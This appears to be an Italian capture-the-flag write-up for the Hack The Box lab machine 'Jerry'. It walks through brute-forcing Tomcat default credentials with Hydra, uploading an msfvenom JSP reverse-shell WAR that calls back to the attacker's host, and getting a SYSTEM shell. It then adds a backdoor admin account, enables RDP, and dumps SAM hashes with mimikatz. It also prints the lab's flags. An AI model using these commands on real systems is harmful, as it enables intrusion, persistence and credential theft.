**Target:10.10.10.95**

# INFORMATION GATHERING 

Per prima cosa eseguiamo un rapido scan con [Nmap](Note/Tool/Nmap.md)
```shell-session
┌──(root㉿kali)-[/home/kali/htb/jerry]
└─# nmap -sT --min-rate=5000 10.10.10.95
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-16 22:54 CET
Nmap scan report for 10.10.10.95
Host is up (0.046s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE
8080/tcp open  http-proxy
```

Approfondiamo la versione

```shell-session
┌──(root㉿kali)-[/home/kali/htb/jerry]
└─# nmap -sTV --min-rate=5000 10.10.10.95
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-16 22:54 CET
Nmap scan report for 10.10.10.95
Host is up (0.054s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.77 seconds
```

uno scan su tutte le porte non ci fornice nessuna nuova porta, quindi abbiamo:

- 8080 Apache Tomcat/Coyote JSP engine 1.1

# ENUMERATION

Visitiamo la `http:10.10.10.95:8080` 
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/tomcat.png)

se andiamo ad `Manager App` ci chiede nelle credenziali di login 
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/tomcat1.png)

Dobbiamo trovare le credenziali  possiamo utilizzare [Hydra](Note/Tool/Hydra.md), e utilizziamo SecList come wordilist dove c'è un lista di credenziali tomcat

```shell-session
┌──(root㉿kali)-[/home/kali/htb/jerry]
└─# hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-16 23:06:54
[DATA] max 16 tasks per 1 server, overall 16 tasks, 76 login tries, ~5 tries per task
[DATA] attacking http-get://10.10.10.95:8080/manager/html
[8080][http-get] host: 10.10.10.95   login: admin   password: admin
[8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-16 23:06:55
```

e finalmente possiamo accedere 
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/tomcat2.png)

L'interfaccia web di gestione ci offre un posto dove caricare i file WAR e un modo per eseguirli manualmente. 
I file WAR  è un archivio utilizzato in java, vediamo se può essere il nostro vettore d'attacco

# GAINING AN INITIAL FOOTHOLD 

Per prima cosa creiamoci il nostro payload
```shell-session
┌──(root㉿kali)-[/home/kali]
└─# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.48 LPORT=4321 -f war -o shell.war
Payload size: 1089 bytes
Final size of war file: 1089 bytes
Saved as: shell.war
```

ci mettiamo in ascolto con nc alla porta inserita nel paylaod

```shell-session
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 4321
listening on [any] 4321 ..
```

lo carichiamo sul server Apache
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/tomcat3.png) 
e visitamo `http://10.10.10.95:8080/shell` ottenendo cosi la nostra shell

```shell-session
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 4321
listening on [any] 4321 ...
connect to [10.10.14.48] from (UNKNOWN) [10.10.10.95] 49193
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system

C:\apache-tomcat-7.0.88>
```

e al seguente percorso troviamo le nostre user e root flag

```cmd
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1".txt
type "2 for the price of 1".txt
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```

# EXTRA

In questa sezione voglio fare un piccolo esercizio ovvero attivare il RDP ed estrarre gli hash NTLM dell account Administrator 

iniziamo abilitando RDP

```shell-session
C:\Users\Administrator\Desktop\flags>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /freg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
The operation completed successfully
```

con questo settiamo il firewall per consentire l'accesso ad RDP

```shell-session
C:\Users\Administrator\Desktop\flags>C:\Users\Administrator\Desktop\flags>netsh advfirewall firewall set rule group="remote desktop" new enable=yes
netsh advfirewall firewall set rule group="remote desktop" new enable=yes

Updated 3 rule(s).
Ok.
```

possiamo verificare che la porta 3389 è aperta con [Nmap](Note/Tool/Nmap.md)

```shell-session
┌──(root㉿kali)-[/home/kali/htb/jerry]
└─# nmap -p 3389 10.10.10.95
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-17 12:29 CET
Nmap scan report for 10.10.10.95
Host is up (0.058s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds
```

adesso aggiungiamo un utente con quale collegarci in RDP

```shell-session
C:\Users\Administrator\Desktop\flags>net user /add xrabbit Test123
net user /add xrabbit Test123
The command completed successfully.
```

aggiungiamo il nostro utente al gruppo localgroup aministrators

```shell-session
C:\>net localgroup administrators xrabbit /add
net localgroup administrators xrabbit /add
The command completed successfully.
```


e finalmente ci possiamo collegare trammite [[xfreerdp]] al target

```shell-session
┌──(root㉿kali)-[/home/kali]
└─# xfreerdp /v:10.10.10.95 /u:xrabbit
[23:49:54:717] [65932:65933] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[23:49:54:717] [65932:65933] [WARN][com.freerdp.crypto] - CN = JERRY
[23:49:54:722] [65932:65933] [ERROR][com.freerdp.crypto] - The host key for 10.10.10.95:3389 has changed
[23:49:54:722] [65932:65933] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[23:49:54:722] [65932:65933] [ERROR][com.freerdp.crypto] - @    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
[23:49:54:722] [65932:65933] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[23:49:54:722] [65932:65933] [ERROR][com.freerdp.crypto] - IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
[23:49:54:722] [65932:65933] [ERROR][com.freerdp.crypto] - Someone could be eavesdropping on you right now (man-in-the-middle attack)!
[23:49:54:722] [65932:65933] [ERROR][com.freerdp.crypto] - It is also possible that a host key has just been changed.
[23:49:54:722] [65932:65933] [ERROR][com.freerdp.crypto] - The fingerprint for the host key sent by the remote host is 0e:1d:27:76:61:ff:c5:7e:8e:6b:47:2d:3a:f5:65:83:0b:64:2f:21:4f:dc:da:68:35:ef:2f:c4:5e:d6:38:f5
[23:49:54:722] [65932:65933] [ERROR][com.freerdp.crypto] - Please contact your system administrator.
[23:49:54:723] [65932:65933] [ERROR][com.freerdp.crypto] - Add correct host key in /root/.config/freerdp/known_hosts2 to get rid of this message.
[23:49:54:723] [65932:65933] [ERROR][com.freerdp.crypto] - Host key for 10.10.10.95 has changed and you have requested strict checking.
[23:49:54:723] [65932:65933] [ERROR][com.freerdp.crypto] - Host key verification failed.
!!!Certificate for 10.10.10.95:3389 (RDP-Server) has changed!!!

New Certificate details:
        Common Name: JERRY
        Subject:     CN = JERRY
        Issuer:      CN = JERRY
        Thumbprint:  0e:1d:27:76:61:ff:c5:7e:8e:6b:47:2d:3a:f5:65:83:0b:64:2f:21:4f:dc:da:68:35:ef:2f:c4:5e:d6:38:f5

Old Certificate details:
        Subject:     CN = JERRY
        Issuer:      CN = JERRY
        Thumbprint:  80:03:e2:bf:05:c9:05:ab:73:bd:63:48:e0:22:df:80:6a:22:a7:04:31:cb:4f:d5:d6:55:88:f9:0a:1c:6d:34

The above X.509 certificate does not match the certificate used for previous connections.
This may indicate that the certificate has been tampered with.
Please contact the administrator of the RDP server and clarify.
Do you trust the above certificate? (Y/T/N) Y
Password:
```

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/tomcat4.png)e ci siamo 

Il prossimo passo è imporatare [Mimikatz](Note/Tool/Mimikatz.md) ed estrarre gli hash 
ci copiamo mimikatz.exe nella nostra directory e attiviamo un server python

```shell-session 
┌──(root㉿kali)-[/home/kali/htb/jerry]
└─# ls
mimikatz.exe

┌──(root㉿kali)-[/home/kali/htb/jerry]
└─# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

ora da ci apriamo un PowerShell e importiamo mimikatz sulla macchina target

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/tomcat5.png)

ci apriamo una console cmd da Administrator ed eseguiamo mimikazt
ed eseguiamo quanto segue 

```cmd
privilege::debug
token::elevate
lsadump::sam
```

nello specifico :

- `privilege::debug`  : da il permsso a mimikatz di accedere e manipolare risorse di sistema normalmente limitate 
- `token::elevate`   : mimikatz cerca di assumere l'identità di amministratore, consentendo ad un utente che non ha i privilegi di amministratore di eseguire operazioni con privilegi elevati
- `lsadump::sam`   :  estrae il database di Security Account Manager (SAM) che contiene gli hash delle password degli utenti 


questo ci permetterà di estrarre gli hash dal SAM

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/tomcat6.png)

che possiamo andare a rompere con [[hashcat]] o [hashes.com](https://hashes.com/en/decrypt/hash) trovando cosi la nostra password

Questo esercizio può dimostrare come possiamo estrarre gli hash anche di altri utenti consentendoci magri di fare lateral moviment  in un rete.




